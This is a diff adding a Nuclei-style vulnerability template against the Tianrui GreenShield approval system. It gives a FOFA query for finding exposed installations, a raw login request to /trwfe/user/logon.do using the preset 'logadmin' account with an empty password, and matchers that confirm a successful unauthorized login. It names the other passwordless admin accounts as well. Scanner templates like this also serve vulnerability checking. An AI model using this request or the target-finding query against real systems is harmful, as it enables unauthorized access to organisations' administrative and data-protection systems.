@@ -1,0 +1,33 @@
+id: tianrui-greenshield-default-password
+
+info:
+  name: "天锐绿盾审批系统 预置账户空口令未授权访问"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    目标系统存在预置账户凭证空口令安全缺陷，攻击者可通过无密码认证的admin、sysadmin、secadmin、logadmin账户实现未授权访问。该漏洞可通过以下FOFA语法定位：
+
+      fofa: body="location.href=location.href+\"trwfe\";"
+
+    受影响账户列表包含：admin、sysadmin、secadmin、logadmin。漏洞披露日期为2025-07-26。
+  tags: 天锐绿盾审批系统
+
+http:
+- raw:
+  - |
+    POST /trwfe/user/logon.do HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+
+    lastName=logadmin&password=&randomCode=&j_language=zh-CN
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [302]
+  - type: word
+    part: body
+    words:
+    - 'Expires'
